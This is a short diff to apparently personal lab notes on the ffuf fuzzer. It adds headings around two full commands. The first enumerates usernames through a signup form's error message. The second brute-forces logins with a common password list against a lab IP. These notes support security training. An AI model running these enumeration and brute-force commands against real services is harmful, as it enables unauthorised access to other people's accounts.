@@ -7,9 +7,12 @@ available from github: https://github.com/ffuf/ffuf
 What is ffuf?
 ffuf fuzz faster u fool. Fuzzing is a technique for locating implementation bugs by using malformed/semi-malformed data injection in an automated fashion.
 
+Username enum
 ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.7.180/customers/signup -mr "username already exists"
 
 create a valid_usenames.txt from results located above, use for next command:
 
+Brute force
 ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.7.180/customers/login -fc 200
 
+Logic flaw
